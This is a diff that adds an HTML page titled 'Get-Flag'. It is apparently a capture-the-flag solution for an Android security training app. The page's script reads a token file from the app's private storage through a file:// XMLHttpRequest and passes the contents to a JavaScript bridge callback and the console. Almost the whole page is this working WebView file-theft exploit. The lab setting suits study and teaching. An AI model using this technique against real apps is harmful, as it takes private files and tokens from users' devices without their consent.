@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Get-Flag</title>
+    <script>
+        function leakFileXHR(url) {
+            const xhr = new XMLHttpRequest();
+            xhr.open('GET', url, true);
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4 && xhr.responseText) {
+                    hextree.authCallback(xhr.responseText);
+                    console.log("Secret: " + xhr.responseText);
+                }
+            };
+            xhr.onerror = function(error) {
+                // console.log(error);
+            }
+            xhr.send();
+        }
+    </script>
+</head>
+<body>
+<button onclick='leakFileXHR("file:///data/data/io.hextree.attacksurface/files/token.txt")'>GetTheFlag</button>
+</body>
+</html>
